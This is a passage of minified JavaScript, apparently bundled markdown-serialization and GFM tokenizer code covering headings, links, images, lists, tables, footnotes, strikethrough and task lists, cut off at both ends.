`+(a===1?"=":"-").repeat(b.length-(Math.max(b.lastIndexOf("\r"),b.lastIndexOf(`
`))+1))}const u="#".repeat(a),f=n.enter("headingAtx"),h=n.enter("phrasing");l.move(u+" ");let m=n.containerPhrasing(e,{before:"# ",after:`
`,...l.current()});return/^[\t ]/.test(m)&&(m=Bu(m.charCodeAt(0))+m.slice(1)),m=m?u+" "+m:u,n.options.closeAtx&&(m+=" "+u),h(),f(),m}NT.peek=GR;function NT(e){return e.value||""}function GR(){return"<"}AT.peek=QR;function AT(e,t,n,r){const a=vx(n),l=a==='"'?"Quote":"Apostrophe",u=n.enter("image");let f=n.enter("label");const h=n.createTracker(r);let m=h.move("![");return m+=h.move(n.safe(e.alt,{before:m,after:"]",...h.current()})),m+=h.move("]("),f(),!e.url&&e.title||/[\0- \u007F]/.test(e.url)?(f=n.enter("destinationLiteral"),m+=h.move("<"),m+=h.move(n.safe(e.url,{before:m,after:">",...h.current()})),m+=h.move(">")):(f=n.enter("destinationRaw"),m+=h.move(n.safe(e.url,{before:m,after:e.title?" ":")",...h.current()}))),f(),e.title&&(f=n.enter(`title${l}`),m+=h.move(" "+a),m+=h.move(n.safe(e.title,{before:m,after:a,...h.current()})),m+=h.move(a),f()),m+=h.move(")"),u(),m}function QR(){return"!"}DT.peek=KR;function DT(e,t,n,r){const a=e.referenceType,l=n.enter("imageReference");let u=n.enter("label");const f=n.createTracker(r);let h=f.move("![");const m=n.safe(e.alt,{before:h,after:"]",...f.current()});h+=f.move(m+"]["),u();const x=n.stack;n.stack=[],u=n.enter("reference");const g=n.safe(n.associationId(e),{before:h,after:"]",...f.current()});return u(),n.stack=x,l(),a==="full"||!m||m!==g?h+=f.move(g+"]"):a==="shortcut"?h=h.slice(0,-1):h+=f.move("]"),h}function KR(){return"!"}LT.peek=XR;function LT(e,t,n){let r=e.value||"",a="`",l=-1;for(;new RegExp("(^|[^`])"+a+"([^`]|$)").test(r);)a+="`";for(/[^ \r\n]/.test(r)&&(/^[ \r\n]/.test(r)&&/[ \r\n]$/.test(r)||/^`|`$/.test(r))&&(r=" "+r+" ");++l<n.unsafe.length;){const u=n.unsafe[l],f=n.compilePattern(u);let h;if(u.atBreak)for(;h=f.exec(r);){let m=h.index;r.charCodeAt(m)===10&&r.charCodeAt(m-1)===13&&m--,r=r.slice(0,m)+" "+r.slice(h.index+1)}}return a+r+a}function XR(){return"`"}function _T(e,t){const n=dx(e);return!!(!t.options.resourceLink&&e.url&&!e.title&&e.children&&e.children.length===1&&e.children[0].type==="text"&&(n===e.url||"mailto:"+n===e.url)&&/^[a-z][a-z+.-]+:/i.test(e.url)&&!/[\0- <>\u007F]/.test(e.url))}IT.peek=ZR;function IT(e,t,n,r){const a=vx(n),l=a==='"'?"Quote":"Apostrophe",u=n.createTracker(r);let f,h;if(_T(e,n)){const x=n.stack;n.stack=[],f=n.enter("autolink");let g=u.move("<");return g+=u.move(n.containerPhrasing(e,{before:g,after:">",...u.current()})),g+=u.move(">"),f(),n.stack=x,g}f=n.enter("link"),h=n.enter("label");let m=u.move("[");return m+=u.move(n.containerPhrasing(e,{before:m,after:"](",...u.current()})),m+=u.move("]("),h(),!e.url&&e.title||/[\0- \u007F]/.test(e.url)?(h=n.enter("destinationLiteral"),m+=u.move("<"),m+=u.move(n.safe(e.url,{before:m,after:">",...u.current()})),m+=u.move(">")):(h=n.enter("destinationRaw"),m+=u.move(n.safe(e.url,{before:m,after:e.title?" ":")",...u.current()}))),h(),e.title&&(h=n.enter(`title${l}`),m+=u.move(" "+a),m+=u.move(n.safe(e.title,{before:m,after:a,...u.current()})),m+=u.move(a),h()),m+=u.move(")"),f(),m}function ZR(e,t,n){return _T(e,n)?"<":"["}PT.peek=JR;function PT(e,t,n,r){const a=e.referenceType,l=n.enter("linkReference");let u=n.enter("label");const f=n.createTracker(r);let h=f.move("[");const m=n.containerPhrasing(e,{before:h,after:"]",...f.current()});h+=f.move(m+"]["),u();const x=n.stack;n.stack=[],u=n.enter("reference");const g=n.safe(n.associationId(e),{before:h,after:"]",...f.current()});return u(),n.stack=x,l(),a==="full"||!m||m!==g?h+=f.move(g+"]"):a==="shortcut"?h=h.slice(0,-1):h+=f.move("]"),h}function JR(){return"["}function bx(e){const t=e.options.bullet||"*";if(t!=="*"&&t!=="+"&&t!=="-")throw new Error("Cannot serialize items with `"+t+"` for `options.bullet`, expected `*`, `+`, or `-`");return t}function eO(e){const t=bx(e),n=e.options.bulletOther;if(!n)return t==="*"?"-":"*";if(n!=="*"&&n!=="+"&&n!=="-")throw new Error("Cannot serialize items with `"+n+"` for `options.bulletOther`, expected `*`, `+`, or `-`");if(n===t)throw new Error("Expected `bullet` (`"+t+"`) and `bulletOther` (`"+n+"`) to be different");return n}function tO(e){const t=e.options.bulletOrdered||".";if(t!=="."&&t!==")")throw new Error("Cannot serialize items with `"+t+"` for `options.bulletOrdered`, expected `.` or `)`");return t}function jT(e){const t=e.options.rule||"*";if(t!=="*"&&t!=="-"&&t!=="_")throw new Error("Cannot serialize rules with `"+t+"` for `options.rule`, expected `*`, `-`, or `_`");return t}function nO(e,t,n,r){const a=n.enter("list"),l=n.bulletCurrent;let u=e.ordered?tO(n):bx(n);const f=e.ordered?u==="."?")":".":eO(n);let h=t&&n.bulletLastUsed?u===n.bulletLastUsed:!1;if(!e.ordered){const x=e.children?e.children[0]:void 0;if((u==="*"||u==="-")&&x&&(!x.children||!x.children[0])&&n.stack[n.stack.length-1]==="list"&&n.stack[n.stack.length-2]==="listItem"&&n.stack[n.stack.length-3]==="list"&&n.stack[n.stack.length-4]==="listItem"&&n.indexStack[n.indexStack.length-1]===0&&n.indexStack[n.indexStack.length-2]===0&&n.indexStack[n.indexStack.length-3]===0&&(h=!0),jT(n)===u&&x){let g=-1;for(;++g<e.children.length;){const b=e.children[g];if(b&&b.type==="listItem"&&b.children&&b.children[0]&&b.children[0].type==="thematicBreak"){h=!0;break}}}}h&&(u=f),n.bulletCurrent=u;const m=n.containerFlow(e,r);return n.bulletLastUsed=u,n.bulletCurrent=l,a(),m}function rO(e){const t=e.options.listItemIndent||"one";if(t!=="tab"&&t!=="one"&&t!=="mixed")throw new Error("Cannot serialize items with `"+t+"` for `options.listItemIndent`, expected `tab`, `one`, or `mixed`");return t}function iO(e,t,n,r){const a=rO(n);let l=n.bulletCurrent||bx(n);t&&t.type==="list"&&t.ordered&&(l=(typeof t.start=="number"&&t.start>-1?t.start:1)+(n.options.incrementListMarker===!1?0:t.children.indexOf(e))+l);let u=l.length+1;(a==="tab"||a==="mixed"&&(t&&t.type==="list"&&t.spread||e.spread))&&(u=Math.ceil(u/4)*4);const f=n.createTracker(r);f.move(l+" ".repeat(u-l.length)),f.shift(u);const h=n.enter("listItem"),m=n.indentLines(n.containerFlow(e,f.current()),x);return h(),m;function x(g,b,E){return b?(E?"":" ".repeat(u))+g:(E?l:l+" ".repeat(u-l.length))+g}}function aO(e,t,n,r){const a=n.enter("paragraph"),l=n.enter("phrasing"),u=n.containerPhrasing(e,r);return l(),a(),u}const sO=hh(["break","delete","emphasis","footnote","footnoteReference","image","imageReference","inlineCode","inlineMath","link","linkReference","mdxJsxTextElement","mdxTextExpression","strong","text","textDirective"]);function lO(e,t,n,r){return(e.children.some(function(u){return sO(u)})?n.containerPhrasing:n.containerFlow).call(n,e,r)}function oO(e){const t=e.options.strong||"*";if(t!=="*"&&t!=="_")throw new Error("Cannot serialize strong with `"+t+"` for `options.strong`, expected `*`, or `_`");return t}RT.peek=uO;function RT(e,t,n,r){const a=oO(n),l=n.enter("strong"),u=n.createTracker(r),f=u.move(a+a);let h=u.move(n.containerPhrasing(e,{after:a,before:f,...u.current()}));const m=h.charCodeAt(0),x=gf(r.before.charCodeAt(r.before.length-1),m,a);x.inside&&(h=Bu(m)+h.slice(1));const g=h.charCodeAt(h.length-1),b=gf(r.after.charCodeAt(0),g,a);b.inside&&(h=h.slice(0,-1)+Bu(g));const E=u.move(a+a);return l(),n.attentionEncodeSurroundingInfo={after:b.outside,before:x.outside},f+h+E}function uO(e,t,n){return n.options.strong||"*"}function cO(e,t,n,r){return n.safe(e.value,r)}function dO(e){const t=e.options.ruleRepetition||3;if(t<3)throw new Error("Cannot serialize rules with repetition `"+t+"` for `options.ruleRepetition`, expected `3` or more");return t}function fO(e,t,n){const r=(jT(n)+(n.options.ruleSpaces?" ":"")).repeat(dO(n));return n.options.ruleSpaces?r.slice(0,-1):r}const OT={blockquote:RR,break:t2,code:UR,definition:WR,emphasis:ST,hardBreak:t2,heading:VR,html:NT,image:AT,imageReference:DT,inlineCode:LT,link:IT,linkReference:PT,list:nO,listItem:iO,paragraph:aO,root:lO,strong:RT,text:cO,thematicBreak:fO};function hO(){return{enter:{table:pO,tableData:n2,tableHeader:n2,tableRow:gO},exit:{codeText:xO,table:mO,tableData:gm,tableHeader:gm,tableRow:gm}}}function pO(e){const t=e._align;this.enter({type:"table",align:t.map(function(n){return n==="none"?null:n}),children:[]},e),this.data.inTable=!0}function mO(e){this.exit(e),this.data.inTable=void 0}function gO(e){this.enter({type:"tableRow",children:[]},e)}function gm(e){this.exit(e)}function n2(e){this.enter({type:"tableCell",children:[]},e)}function xO(e){let t=this.resume();this.data.inTable&&(t=t.replace(/\\([\\|])/g,yO));const n=this.stack[this.stack.length-1];n.type,n.value=t,this.exit(e)}function yO(e,t){return t==="|"?t:e}function vO(e){const t=e||{},n=t.tableCellPadding,r=t.tablePipeAlign,a=t.stringLength,l=n?" ":"|";return{unsafe:[{character:"\r",inConstruct:"tableCell"},{character:`
`,inConstruct:"tableCell"},{atBreak:!0,character:"|",after:"[	 :-]"},{character:"|",inConstruct:"tableCell"},{atBreak:!0,character:":",after:"-"},{atBreak:!0,character:"-",after:"[:|-]"}],handlers:{inlineCode:b,table:u,tableCell:h,tableRow:f}};function u(E,C,P,O){return m(x(E,P,O),E.align)}function f(E,C,P,O){const N=g(E,P,O),T=m([N]);return T.slice(0,T.indexOf(`
`))}function h(E,C,P,O){const N=P.enter("tableCell"),T=P.enter("phrasing"),A=P.containerPhrasing(E,{...O,before:l,after:l});return T(),N(),A}function m(E,C){return PR(E,{align:C,alignDelimiters:r,padding:n,stringLength:a})}function x(E,C,P){const O=E.children;let N=-1;const T=[],A=C.enter("table");for(;++N<O.length;)T[N]=g(O[N],C,P);return A(),T}function g(E,C,P){const O=E.children;let N=-1;const T=[],A=C.enter("tableRow");for(;++N<O.length;)T[N]=h(O[N],E,C,P);return A(),T}function b(E,C,P){let O=OT.inlineCode(E,C,P);return P.stack.includes("tableCell")&&(O=O.replace(/\|/g,"\\$&")),O}}function bO(){return{exit:{taskListCheckValueChecked:r2,taskListCheckValueUnchecked:r2,paragraph:wO}}}function EO(){return{unsafe:[{atBreak:!0,character:"-",after:"[:|-]"}],handlers:{listItem:kO}}}function r2(e){const t=this.stack[this.stack.length-2];t.type,t.checked=e.type==="taskListCheckValueChecked"}function wO(e){const t=this.stack[this.stack.length-2];if(t&&t.type==="listItem"&&typeof t.checked=="boolean"){const n=this.stack[this.stack.length-1];n.type;const r=n.children[0];if(r&&r.type==="text"){const a=t.children;let l=-1,u;for(;++l<a.length;){const f=a[l];if(f.type==="paragraph"){u=f;break}}u===n&&(r.value=r.value.slice(1),r.value.length===0?n.children.shift():n.position&&r.position&&typeof r.position.start.offset=="number"&&(r.position.start.column++,r.position.start.offset++,n.position.start=Object.assign({},r.position.start)))}}this.exit(e)}function kO(e,t,n,r){const a=e.children[0],l=typeof e.checked=="boolean"&&a&&a.type==="paragraph",u="["+(e.checked?"x":" ")+"] ",f=n.createTracker(r);l&&f.move(u);let h=OT.listItem(e,t,n,{...r,...f.current()});return l&&(h=h.replace(/^(?:[*+-]|\d+\.)([\r\n]| {1,3})/,m)),h;function m(x){return x+u}}function TO(){return[nR(),kR(),NR(),hO(),bO()]}function CO(e){return{extensions:[rR(),TR(e),AR(),vO(e),EO()]}}const SO={tokenize:IO,partial:!0},FT={tokenize:PO,partial:!0},MT={tokenize:jO,partial:!0},BT={tokenize:RO,partial:!0},NO={tokenize:OO,partial:!0},HT={name:"wwwAutolink",tokenize:LO,previous:zT},UT={name:"protocolAutolink",tokenize:_O,previous:WT},zi={name:"emailAutolink",tokenize:DO,previous:qT},hi={};function AO(){return{text:hi}}let Qa=48;for(;Qa<123;)hi[Qa]=zi,Qa++,Qa===58?Qa=65:Qa===91&&(Qa=97);hi[43]=zi;hi[45]=zi;hi[46]=zi;hi[95]=zi;hi[72]=[zi,UT];hi[104]=[zi,UT];hi[87]=[zi,HT];hi[119]=[zi,HT];function DO(e,t,n){const r=this;let a,l;return u;function u(g){return!j0(g)||!qT.call(r,r.previous)||Ex(r.events)?n(g):(e.enter("literalAutolink"),e.enter("literalAutolinkEmail"),f(g))}function f(g){return j0(g)?(e.consume(g),f):g===64?(e.consume(g),h):n(g)}function h(g){return g===46?e.check(NO,x,m)(g):g===45||g===95||On(g)?(l=!0,e.consume(g),h):x(g)}function m(g){return e.consume(g),a=!0,h}function x(g){return l&&a&&Kn(r.previous)?(e.exit("literalAutolinkEmail"),e.exit("literalAutolink"),t(g)):n(g)}}function LO(e,t,n){const r=this;return a;function a(u){return u!==87&&u!==119||!zT.call(r,r.previous)||Ex(r.events)?n(u):(e.enter("literalAutolink"),e.enter("literalAutolinkWww"),e.check(SO,e.attempt(FT,e.attempt(MT,l),n),n)(u))}function l(u){return e.exit("literalAutolinkWww"),e.exit("literalAutolink"),t(u)}}function _O(e,t,n){const r=this;let a="",l=!1;return u;function u(g){return(g===72||g===104)&&WT.call(r,r.previous)&&!Ex(r.events)?(e.enter("literalAutolink"),e.enter("literalAutolinkHttp"),a+=String.fromCodePoint(g),e.consume(g),f):n(g)}function f(g){if(Kn(g)&&a.length<5)return a+=String.fromCodePoint(g),e.consume(g),f;if(g===58){const b=a.toLowerCase();if(b==="http"||b==="https")return e.consume(g),h}return n(g)}function h(g){return g===47?(e.consume(g),l?m:(l=!0,h)):n(g)}function m(g){return g===null||pf(g)||At(g)||gs(g)||ch(g)?n(g):e.attempt(FT,e.attempt(MT,x),n)(g)}function x(g){return e.exit("literalAutolinkHttp"),e.exit("literalAutolink"),t(g)}}function IO(e,t,n){let r=0;return a;function a(u){return(u===87||u===119)&&r<3?(r++,e.consume(u),a):u===46&&r===3?(e.consume(u),l):n(u)}function l(u){return u===null?n(u):t(u)}}function PO(e,t,n){let r,a,l;return u;function u(m){return m===46||m===95?e.check(BT,h,f)(m):m===null||At(m)||gs(m)||m!==45&&ch(m)?h(m):(l=!0,e.consume(m),u)}function f(m){return m===95?r=!0:(a=r,r=void 0),e.consume(m),u}function h(m){return a||r||!l?n(m):t(m)}}function jO(e,t){let n=0,r=0;return a;function a(u){return u===40?(n++,e.consume(u),a):u===41&&r<n?l(u):u===33||u===34||u===38||u===39||u===41||u===42||u===44||u===46||u===58||u===59||u===60||u===63||u===93||u===95||u===126?e.check(BT,t,l)(u):u===null||At(u)||gs(u)?t(u):(e.consume(u),a)}function l(u){return u===41&&r++,e.consume(u),a}}function RO(e,t,n){return r;function r(f){return f===33||f===34||f===39||f===41||f===42||f===44||f===46||f===58||f===59||f===63||f===95||f===126?(e.consume(f),r):f===38?(e.consume(f),l):f===93?(e.consume(f),a):f===60||f===null||At(f)||gs(f)?t(f):n(f)}function a(f){return f===null||f===40||f===91||At(f)||gs(f)?t(f):r(f)}function l(f){return Kn(f)?u(f):n(f)}function u(f){return f===59?(e.consume(f),r):Kn(f)?(e.consume(f),u):n(f)}}function OO(e,t,n){return r;function r(l){return e.consume(l),a}function a(l){return On(l)?n(l):t(l)}}function zT(e){return e===null||e===40||e===42||e===95||e===91||e===93||e===126||At(e)}function WT(e){return!Kn(e)}function qT(e){return!(e===47||j0(e))}function j0(e){return e===43||e===45||e===46||e===95||On(e)}function Ex(e){let t=e.length,n=!1;for(;t--;){const r=e[t][1];if((r.type==="labelLink"||r.type==="labelImage")&&!r._balanced){n=!0;break}if(r._gfmAutolinkLiteralWalkedInto){n=!1;break}}return e.length>0&&!n&&(e[e.length-1][1]._gfmAutolinkLiteralWalkedInto=!0),n}const FO={tokenize:$O,partial:!0};function MO(){return{document:{91:{name:"gfmFootnoteDefinition",tokenize:zO,continuation:{tokenize:WO},exit:qO}},text:{91:{name:"gfmFootnoteCall",tokenize:UO},93:{name:"gfmPotentialFootnoteCall",add:"after",tokenize:BO,resolveTo:HO}}}}function BO(e,t,n){const r=this;let a=r.events.length;const l=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]);let u;for(;a--;){const h=r.events[a][1];if(h.type==="labelImage"){u=h;break}if(h.type==="gfmFootnoteCall"||h.type==="labelLink"||h.type==="label"||h.type==="image"||h.type==="link")break}return f;function f(h){if(!u||!u._balanced)return n(h);const m=Qr(r.sliceSerialize({start:u.end,end:r.now()}));return m.codePointAt(0)!==94||!l.includes(m.slice(1))?n(h):(e.enter("gfmFootnoteCallLabelMarker"),e.consume(h),e.exit("gfmFootnoteCallLabelMarker"),t(h))}}function HO(e,t){let n=e.length;for(;n--;)if(e[n][1].type==="labelImage"&&e[n][0]==="enter"){e[n][1];break}e[n+1][1].type="data",e[n+3][1].type="gfmFootnoteCallLabelMarker";const r={type:"gfmFootnoteCall",start:Object.assign({},e[n+3][1].start),end:Object.assign({},e[e.length-1][1].end)},a={type:"gfmFootnoteCallMarker",start:Object.assign({},e[n+3][1].end),end:Object.assign({},e[n+3][1].end)};a.end.column++,a.end.offset++,a.end._bufferIndex++;const l={type:"gfmFootnoteCallString",start:Object.assign({},a.end),end:Object.assign({},e[e.length-1][1].start)},u={type:"chunkString",contentType:"string",start:Object.assign({},l.start),end:Object.assign({},l.end)},f=[e[n+1],e[n+2],["enter",r,t],e[n+3],e[n+4],["enter",a,t],["exit",a,t],["enter",l,t],["enter",u,t],["exit",u,t],["exit",l,t],e[e.length-2],e[e.length-1],["exit",r,t]];return e.splice(n,e.length-n+1,...f),e}function UO(e,t,n){const r=this,a=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]);let l=0,u;return f;function f(g){return e.enter("gfmFootnoteCall"),e.enter("gfmFootnoteCallLabelMarker"),e.consume(g),e.exit("gfmFootnoteCallLabelMarker"),h}function h(g){return g!==94?n(g):(e.enter("gfmFootnoteCallMarker"),e.consume(g),e.exit("gfmFootnoteCallMarker"),e.enter("gfmFootnoteCallString"),e.enter("chunkString").contentType="string",m)}function m(g){if(l>999||g===93&&!u||g===null||g===91||At(g))return n(g);if(g===93){e.exit("chunkString");const b=e.exit("gfmFootnoteCallString");return a.includes(Qr(r.sliceSerialize(b)))?(e.enter("gfmFootnoteCallLabelMarker"),e.consume(g),e.exit("gfmFootnoteCallLabelMarker"),e.exit("gfmFootnoteCall"),t):n(g)}return At(g)||(u=!0),l++,e.consume(g),g===92?x:m}function x(g){return g===91||g===92||g===93?(e.consume(g),l++,m):m(g)}}function zO(e,t,n){const r=this,a=r.parser.gfmFootnotes||(r.parser.gfmFootnotes=[]);let l,u=0,f;return h;function h(C){return e.enter("gfmFootnoteDefinition")._container=!0,e.enter("gfmFootnoteDefinitionLabel"),e.enter("gfmFootnoteDefinitionLabelMarker"),e.consume(C),e.exit("gfmFootnoteDefinitionLabelMarker"),m}function m(C){return C===94?(e.enter("gfmFootnoteDefinitionMarker"),e.consume(C),e.exit("gfmFootnoteDefinitionMarker"),e.enter("gfmFootnoteDefinitionLabelString"),e.enter("chunkString").contentType="string",x):n(C)}function x(C){if(u>999||C===93&&!f||C===null||C===91||At(C))return n(C);if(C===93){e.exit("chunkString");const P=e.exit("gfmFootnoteDefinitionLabelString");return l=Qr(r.sliceSerialize(P)),e.enter("gfmFootnoteDefinitionLabelMarker"),e.consume(C),e.exit("gfmFootnoteDefinitionLabelMarker"),e.exit("gfmFootnoteDefinitionLabel"),b}return At(C)||(f=!0),u++,e.consume(C),C===92?g:x}function g(C){return C===91||C===92||C===93?(e.consume(C),u++,x):x(C)}function b(C){return C===58?(e.enter("definitionMarker"),e.consume(C),e.exit("definitionMarker"),a.includes(l)||a.push(l),ft(e,E,"gfmFootnoteDefinitionWhitespace")):n(C)}function E(C){return t(C)}}function WO(e,t,n){return e.check(nc,t,e.attempt(FO,t,n))}function qO(e){e.exit("gfmFootnoteDefinition")}function $O(e,t,n){const r=this;return ft(e,a,"gfmFootnoteDefinitionIndent",5);function a(l){const u=r.events[r.events.length-1];return u&&u[1].type==="gfmFootnoteDefinitionIndent"&&u[2].sliceSerialize(u[1],!0).length===4?t(l):n(l)}}function YO(e){let n=(e||{}).singleTilde;const r={name:"strikethrough",tokenize:l,resolveAll:a};return n==null&&(n=!0),{text:{126:r},insideSpan:{null:[r]},attentionMarkers:{null:[126]}};function a(u,f){let h=-1;for(;++h<u.length;)if(u[h][0]==="enter"&&u[h][1].type==="strikethroughSequenceTemporary"&&u[h][1]._close){let m=h;for(;m--;)if(u[m][0]==="exit"&&u[m][1].type==="strikethroughSequenceTemporary"&&u[m][1]._open&&u[h][1].end.offset-u[h][1].start.offset===u[m][1].end.offset-u[m][1].start.offset){u[h][1].type="strikethroughSequence",u[m][1].type="strikethroughSequence";const x={type:"strikethrough",start:Object.assign({},u[m][1].start),end:Object.assign({},u[h][1].end)},g={type:"strikethroughText",start:Object.assign({},u[m][1].end),end:Object.assign({},u[h][1].start)},b=[["enter",x,f],["enter",u[m][1],f],["exit",u[m][1],f],["enter",g,f]],E=f.parser.constructs.insideSpan.null;E&&vr(b,b.length,0,dh(E,u.slice(m+1,h),f)),vr(b,b.length,0,[["exit",g,f],["enter",u[h][1],f],["exit",u[h][1],f],["exit",x,f]]),vr(u,m-1,h-m+3,b),h=m+b.length-2;break}}for(h=-1;++h<u.length;)u[h][1].type==="strikethroughSequenceTemporary"&&(u[h][1].type="data");return u}function l(u,f,h){const m=this.previous,x=this.events;let g=0;return b;function b(C){return m===126&&x[x.length-1][1].type!=="characterEscape"?h(C):(u.enter("strikethroughSequenceTemporary"),E(C))}function E(C){const P=Ll(m);if(C===126)return g>1?h(C):(u.consume(C),g++,E);if(g<2&&!n)return h(C);const O=u.exit("strikethroughSequenceTemporary"),N=Ll(C);return O._open=!N||N===2&&!!P,O._close=!P||P===2&&!!N,f(C)}}}class VO{constructor(){this.map=[]}add(t,n,r){GO(this,t,n,r)}consume(t){if(this.map.sort(function(l,u){return l[0]-u[0]}),this.map.length===0)return;let n=this.map.length;const r=[];for(;n>0;)n-=1,r.push(t.slice(this.map[n][0]+this.map[n][1]),this.map[n][2]),t.length=this.map[n][0];r.push(t.slice()),t.length=0;let a=r.pop();for(;a;){for(const l of a)t.push(l);a=r.pop()}this.map.length=0}}function GO(e,t,n,r){let a=0;if(!(n===0&&r.length===0)){for(;a<e.map.length;){if(e.map[a][0]===t){e.map[a][1]+=n,e.map[a][2].push(...r);return}a+=1}e.map.push([t,n,r])}}function QO(e,t){let n=!1;const r=[];for(;t<e.length;){const a=e[t];if(n){if(a[0]==="enter")a[1].type==="tableContent"&&r.push(e[t+1][1].type==="tableDelimiterMarker"?"left":"none");else if(a[1].type==="tableContent"){if(e[t-1][1].type==="tableDelimiterMarker"){const l=r.length-1;r[l]=r[l]==="left"?"center":"right"}}else if(a[1].type==="tableDelimiterRow")break}else a[0]==="enter"&&a[1].type==="tableDelimiterRow"&&(n=!0);t+=1}return r}function KO(){return{flow:{null:{name:"table",tokenize:XO,resolveAll:ZO}}}}function XO(e,t,n){const r=this;let a=0,l=0,u;return f;function f(Y){let ne=r.events.length-1;for(;ne>-1;){const ye=r.events[ne][1].type;if(ye==="lineEnding"||ye==="linePrefix")ne--;else break}const Z=ne>-1?r.events[ne][1].type:null,me=Z==="tableHead"||Z==="tableRow"?R:h;return me===R&&r.parser.lazy[r.now().line]?n(Y):me(Y)}function h(Y){return e.enter("tableHead"),e.enter("tableRow"),m(Y)}function m(Y){return Y===124||(u=!0,l+=1),x(Y)}function x(Y){return Y===null?n(Y):Xe(Y)?l>1?(l=0,r.interrupt=!0,e.exit("tableRow"),e.enter("lineEnding"),e.consume(Y),e.exit("lineEnding"),E):n(Y):ct(Y)?ft(e,x,"whitespace")(Y):(l+=1,u&&(u=!1,a+=1),Y===124?(e.enter("tableCellDivider"),e.consume(Y),e.exit("tableCellDivider"),u=!0,x):(e.enter("data"),g(Y)))}function g(Y){return Y===null||Y===124||At(Y)?(e.exit("data"),x(Y)):(e.consume(Y),Y===92?b:g)}function b(Y){return Y===92||Y===124?(e.consume(Y),g):g(Y)}function E(Y){return r.interrupt=!1,r.parser.lazy[r.now().line]?n(Y):(e.enter("tableDelimiterRow"),u=!1,ct(Y)?ft(e,C,"linePrefix",r.parser.constructs.disable.null.includes("codeIndented")?void 0:4)(Y):C(Y))}function C(Y){return Y===45||Y===58?O(Y):Y===124?(u=!0,e.enter("tableCellDivider"),e.consume(Y),e.exit("tableCellDivider"),P):M(Y)}function P(Y){return ct(Y)?ft(e,O,"whitespace")(Y):O(Y)}function O(Y){return Y===58?(l+=1,u=!0,e.enter("tableDelimiterMarker"),e.consume(Y),e.exit("tableDelimiterMarker"),N):Y===45?(l+=1,N(Y)):Y===null||Xe(Y)?_(Y):M(Y)}function N(Y){return Y===45?(e.enter("tableDelimiterFiller"),T(Y)):M(Y)}function T(Y){return Y===45?(e.consume(Y),T):Y===58?(u=!0,e.exit("tableDelimiterFiller"),e.enter("tableDelimiterMarker"),e.consume(Y),e.exit("tableDelimiterMarker"),A):(e.exit("tableDelimiterFiller"),A(Y))}function A(Y){return ct(Y)?ft(e,_,"whitespace")(Y):_(Y)}function _(Y){return Y===124?C(Y):Y===null||Xe(Y)?!u||a!==l?M(Y):(e.exit("tableDelimiterRow"),e.exit("tableHead"),t(Y)):M(Y)}function M(Y){return n(Y)}function R(Y){return e.enter("tableRow"),B(Y)}function B(Y){return Y===124?(e.enter("tableCellDivider"),e.consume(Y),e.exit("tableCellDivider"),B):Y===null||Xe(Y)?(e.exit("tableRow"),t(Y)):ct(Y)?ft(e,B,"whitespace")(Y):(e.enter("data"),U(Y))}function U(Y){return Y===null||Y===124||At(Y)?(e.exit("data"),B(Y)):(e.consume(Y),Y===92?$:U)}function $(Y){return Y===92||Y===124?(e.consume(Y),U):U(Y)}}function ZO(e,t){let n=-1,r=!0,a=0,l=[0,0,0,0],u=[0,0,0,0],f=!1,h=0,m,x,g;const b=new VO;for(;++n<e.length;){const E=e[n],C=E[1];E[0]==="enter"?C.type==="tableHead"?(f=!1,h!==0&&(i2(b,t,h,m,x),x=void 0,h=0),m={type:"table",start:Object.assign({},C.start),end:Object.assign({},C.end)},b.add(n,0,[["enter",m,t]])):C.type==="tableRow"||C.type==="tableDelimiterRow"?(r=!0,g=void 0,l=[0,0,0,0],u=[0,n+1,0,0],f&&(f=!1,x={type:"tableBody",start:Object.assign({},C.start),end:Object.assign({},C.end)},b.add(n,0,[["enter",x,t]])),a=C.type==="tableDelimiterRow"?2:x?3:1):a&&(C.type==="data"||C.type==="tableDelimiterMarker"||C.type==="tableDelimiterFiller")?(r=!1,u[2]===0&&(l[1]!==0&&(u[0]=u[1],g=dd(b,t,l,a,void 0,g),l=[0,0,0,0]),u[2]=n)):C.type==="tableCellDivider"&&(r?r=!1:(l[1]!==0&&(u[0]=u[1],g=dd(b,t,l,a,void 0,g)),l=u,u=[l[1],n,0,0])):C.type==="tableHead"?(f=!0,h=n):C.type==="tableRow"||C.type==="tableDelimiterRow"?(h=n,l[1]!==0?(u[0]=u[1],g=dd(b,t,l,a,n,g)):u[1]!==0&&(g=dd(b,t,u,a,n,g)),a=0):a&&(C.type==="data"||C.type==="tableDelimiterMarker"||C.type==="tableDelimiterFiller")&&(u[3]=n)}for(h!==0&&i2(b,t,h,m,x),b.consume(t.events),n=-1;++n<t.events.length;){const E=t.events[n];E[0]==="enter"&&E[1].type==="table"&&(E[1]._align=QO(t.events,n))}return e}function dd(e,t,n,r,a,l){const u=r===1?"tableHeader":r===2?"tableDelimiter":"tableData",f="tableContent";n[0]!==0&&(l.end=Object.assign({},Qs(t.events,n[0])),e.add(n[0],0,[["exit",l,t]]));const h=Qs(t.events,n[1]);if(l={type:u,start:Object.assign({},h),end:Object.assign({},h)},e.add(n[1],0,[["enter",l,t]]),n[2]!==0){const m=Qs(t.events,n[2]),x=Qs(t.events,n[3]),g={type:f,start:Object.assign({},m),end:Object.assign({},x)};if(e.add(n[2],0,[["enter",g,t]]),r!==2){const b=t.events[n[2]],E=t.events[n[3]];if(b[1].end=Object.assign({},E[1].end),b[1].type="chunkText",b[1].contentType="text",n[3]>n[2]+1){const C=n[2]+1,P=n[3]-n[2]-1;e.add(C,P,[])}}e.add(n[3]+1,0,[["exit",g,t]])}return a!==void 0&&(l.end=Object.assign({},Qs(t.events,a)),e.add(a,0,[["exit",l,t]]),l=void 0),l}function i2(e,t,n,r,a){const l=[],u=Qs(t.events,n);a&&(a.end=Object.assign({},u),l.push(["exit",a,t])),r.end=Object.assign({},u),l.push(["exit",r,t]),e.add(n+1,0,l)}function Qs(e,t){const n=e[t],r=n[0]==="enter"?"start":"end";return n[1][r]}const JO={name:"tasklistCheck",tokenize:tF};function eF(){return{text:{91:JO}}}function tF(e,t,n){const r=this;return a;function a(h){return r.previous!==null||!r._gfmTasklistFirstContentOfListItem?n(h):(e.enter("taskListCheck"),e.enter("taskListCheckMarker"),e.consume(h),e.exit("taskListCheckMarker"),l)}function l(h){return At(h)?(e.enter("taskListCheckValueUnchecked"),e.consume(h),e.exit("taskListCheckValueUnchecked"),u):h===88||h===120?(e.enter("taskListCheckValueChecked"),e.consume(h),e.exit("taskListCheckValueChecked"),u):n(h)}function u(h){return 